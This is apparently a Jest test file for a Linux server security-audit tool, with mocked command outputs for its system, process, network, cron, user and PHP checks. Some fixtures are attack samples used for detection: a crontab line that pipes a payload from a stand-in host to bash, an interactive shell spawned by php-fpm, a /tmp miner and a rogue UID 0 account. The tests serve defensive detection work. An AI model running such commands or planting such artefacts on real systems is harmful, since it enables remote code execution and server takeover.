import {
  runSystemAudit,
  runProcessAudit,
  runNetworkAudit,
  runFirewallAudit,
  runFail2BanAudit,
  runServiceAudit,
  runFilesystemAudit,
  runCronAudit,
  runUserAudit,
  runCyberPanelAudit,
  runPhpAudit,
  runSecurityToolsAudit,
} from "./server-checks";

describe("Server Checks - Deep Collectors", () => {
  const createMockExecutor = (responses: Record<string, string>) => ({
    execute: jest.fn().mockImplementation((cmd: string) => {
      for (const [pattern, out] of Object.entries(responses)) {
        if (cmd.includes(pattern)) {
          return Promise.resolve({ stdout: out, stderr: "", code: 0 });
        }
      }
      return Promise.resolve({ stdout: "", stderr: "", code: 0 });
    }),
  });

  describe("runSystemAudit", () => {
    it("detects reboot required and high disk usage", async () => {
      const exec = createMockExecutor({
        "os-release": 'PRETTY_NAME="Ubuntu 22.04 LTS"',
        "reboot-required": "reboot_required",
        "df -Pk /": "/dev/sda1 1000000 950000 50000 95% /",
        "df -Pi /": "/dev/sda1 500000 450000 50000 90% /",
        "free -m": "Mem: 8000 7800 200 100 100 250",
        "timedatectl status": "NTP service: inactive",
      });

      const findings = await runSystemAudit(exec);
      expect(findings.some((f) => f.title.includes("reboot required"))).toBe(true);
      expect(findings.some((f) => f.title.includes("disk usage critically high"))).toBe(true);
      expect(findings.some((f) => f.title.includes("inode usage elevated"))).toBe(true);
      expect(findings.some((f) => f.title.includes("memory critically low"))).toBe(true);
      expect(findings.some((f) => f.title.includes("NTP time synchronization"))).toBe(true);
    });
  });

  describe("runProcessAudit", () => {
    it("detects deleted running executables and /tmp processes", async () => {
      const exec = createMockExecutor({
        "grep -i '(deleted)'": "lrwxrwxrwx 1 root root 0 Aug 11 /proc/1234/exe -> /tmp/miner (deleted)",
        "/proc/1234/cmdline": "./miner --cpu-priority=5",
        "grep -E '(/tmp|/var/tmp|/dev/shm)'": "lrwxrwxrwx 1 root root 0 /proc/5678/exe -> /tmp/script.sh",
        "php-fpm": "100 50 www-data /bin/bash -i",
      });

      const findings = await runProcessAudit(exec);
      expect(findings.some((f) => f.category === "DELETED_EXECUTABLE")).toBe(true);
      expect(findings.some((f) => f.title.includes("temporary directories"))).toBe(true);
      expect(findings.some((f) => f.title.includes("interactive shell"))).toBe(true);
    });
  });

  describe("runNetworkAudit", () => {
    it("detects sensitive database ports listening on 0.0.0.0", async () => {
      const exec = createMockExecutor({
        "ss -tlnp":
          "LISTEN 0 128 0.0.0.0:3306 0.0.0.0:* users:((\"mysqld\",pid=100))\n" +
          "LISTEN 0 128 0.0.0.0:6379 0.0.0.0:* users:((\"redis-server\",pid=101))\n" +
          "LISTEN 0 128 0.0.0.0:23 0.0.0.0:* users:((\"telnetd\",pid=102))",
      });

      const findings = await runNetworkAudit(exec);
      expect(findings.some((f) => f.title.includes("MySQL / MariaDB"))).toBe(true);
      expect(findings.some((f) => f.title.includes("Redis"))).toBe(true);
      expect(findings.some((f) => f.title.includes("Telnet"))).toBe(true);
    });
  });

  describe("runFirewallAudit", () => {
    it("detects inactive firewall and open cyberpanel port", async () => {
      const execInactive = createMockExecutor({
        "ufw status": "Status: inactive",
        "iptables -L": "",
      });
      const findings = await runFirewallAudit(execInactive);
      expect(findings.some((f) => f.title.includes("No host-based firewall"))).toBe(true);

      const execUfwWith8090 = createMockExecutor({
        "ufw status": "Status: active\n8090/tcp ALLOW Anywhere",
      });
      const findingsActive = await runFirewallAudit(execUfwWith8090);
      expect(findingsActive.some((f) => f.title.includes("8090"))).toBe(true);
    });
  });

  describe("runFail2BanAudit", () => {
    it("detects active jails and ban counts", async () => {
      const exec = {
        execute: jest.fn().mockImplementation((cmd: string) => {
          if (cmd.includes("is-active fail2ban")) {
            return Promise.resolve({ stdout: "active", stderr: "", code: 0 });
          }
          if (cmd.includes("status sshd")) {
            return Promise.resolve({ stdout: "Currently banned: 5", stderr: "", code: 0 });
          }
          if (cmd.includes("status recidive")) {
            return Promise.resolve({ stdout: "Currently banned: 10", stderr: "", code: 0 });
          }
          if (cmd.includes("fail2ban-client status")) {
            return Promise.resolve({ stdout: "Jail list:\tsshd, recidive", stderr: "", code: 0 });
          }
          return Promise.resolve({ stdout: "", stderr: "", code: 0 });
        }),
      };

      const findings = await runFail2BanAudit(exec);
      expect(findings.length).toBe(1);
      expect(findings[0].title).toContain("15 currently banned IPs");
    });
  });

  describe("runFilesystemAudit", () => {
    it("detects exposed SQL backups and world-writable /etc files", async () => {
      const exec = createMockExecutor({
        "find /home/*/public_html": "/home/example/public_html/backup.sql\n/home/example/public_html/db.sql.gz",
        "find /etc": "/etc/vulnerable.conf",
      });

      const findings = await runFilesystemAudit(exec);
      expect(findings.some((f) => f.category === "EXPOSED_BACKUPS")).toBe(true);
      expect(findings.some((f) => f.category === "WORLD_WRITABLE")).toBe(true);
    });
  });

  describe("runCronAudit", () => {
    it("detects suspicious curl piping in crontab", async () => {
      const exec = createMockExecutor({
        "/etc/crontab": "* * * * * root curl -s https://bad.site/payload.sh | bash",
      });

      const findings = await runCronAudit(exec);
      expect(findings.some((f) => f.category === "CRON_JOBS")).toBe(true);
    });
  });

  describe("runUserAudit", () => {
    it("detects rogue UID 0 accounts and NOPASSWD sudoers", async () => {
      const exec = createMockExecutor({
        "awk -F: '($3 == 0)": "root\nhacker",
        "NOPASSWD": "dev ALL=(ALL) NOPASSWD: ALL",
      });

      const findings = await runUserAudit(exec);
      expect(findings.some((f) => f.title.includes("hacker"))).toBe(true);
      expect(findings.some((f) => f.title.includes("NOPASSWD"))).toBe(true);
    });
  });

  describe("runCyberPanelAudit & runPhpAudit & runSecurityToolsAudit", () => {
    it("gathers CyberPanel version, PHP vulnerabilities, and tool inventory", async () => {
      const exec = createMockExecutor({
        "CyberCP/version.txt": "2.3.4",
        "is-active lscpd": "active",
        "which php": "/usr/bin/php8.1",
        "-i": "allow_url_include => On\nexpose_php => On",
        "echo \"fail2ban:": "fail2ban:active\nclamav:missing\nufw:Status: active\napparmor:active",
      });

      const cpFindings = await runCyberPanelAudit(exec);
      expect(cpFindings.some((f) => f.title.includes("CyberPanel v2.3.4"))).toBe(true);

      const phpFindings = await runPhpAudit(exec);
      expect(phpFindings.some((f) => f.title.includes("allow_url_include"))).toBe(true);

      const toolsFindings = await runSecurityToolsAudit(exec);
      expect(toolsFindings.some((f) => f.category === "SECURITY_TOOLS")).toBe(true);
    });
  });
});
